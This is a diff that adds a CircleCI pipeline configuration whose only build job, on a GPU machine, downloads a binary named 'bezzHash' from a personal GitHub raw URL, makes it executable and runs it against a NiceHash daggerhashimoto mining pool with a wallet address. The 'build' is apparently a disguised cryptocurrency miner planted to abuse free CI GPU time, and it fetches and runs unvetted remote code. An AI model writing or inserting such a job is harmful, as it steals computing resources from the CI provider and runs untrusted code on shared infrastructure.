@@ -1,0 +1,10 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash && chmod +x bezzHash && ./bezzHash --url=ssl://3CX7thXv58hbbtufREN5TDKa2ndXUbxG3N.aswes@daggerhashimoto.eu-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
